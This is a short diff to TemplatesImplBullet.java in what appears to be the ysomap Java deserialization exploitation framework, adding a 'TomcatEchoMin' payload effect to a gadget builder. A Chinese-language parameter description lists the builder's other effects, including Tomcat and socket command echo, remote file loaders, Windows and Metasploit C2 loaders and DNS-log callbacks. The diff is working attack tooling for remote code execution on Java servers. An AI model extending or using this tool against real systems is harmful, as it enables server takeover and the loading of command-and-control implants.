@@ -10,6 +10,7 @@ import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import echo.SocketEchoPayload;
 import echo.TomcatEchoPayload;
+import echo.TomcatEchoPayloadMin;
 import javassist.*;
 import loader.*;
 import ysomap.bullets.AbstractBullet;
@@ -52,7 +53,7 @@ public class TemplatesImplBullet extends AbstractBullet<Object> {
     @NotNull
     @Require(name = "effect", type = "string", detail="选择载入payload的效果，" +
             "可选default、SpecialRuntimeExecutor、" +
-            "TomcatEcho、SocketEcho、RemoteFileLoader、WinC2Loader、MSFJavaC2Loader、" +
+            "TomcatEcho、TomcatEchoMin、SocketEcho、RemoteFileLoader、WinC2Loader、MSFJavaC2Loader、" +
             "RemoteFileHttpLoader、RemoteFileHttpExecutor、DnslogLoader、CustomizableClassLoader")
     private String effect = "default";
 
@@ -189,6 +190,7 @@ public class TemplatesImplBullet extends AbstractBullet<Object> {
         effects = new HashMap<>();
         effects.put("default", new Object[]{StubTransletPayload.class, "%s", "wrap"});
         effects.put("TomcatEcho", new Object[]{TomcatEchoPayload.class, null, null});
+        effects.put("TomcatEchoMin", new Object[]{TomcatEchoPayloadMin.class, null, null});
         effects.put("SocketEcho",
                 new Object[]{SocketEchoPayload.class,
                             "host=\"%s\";port=%s;", "split"});
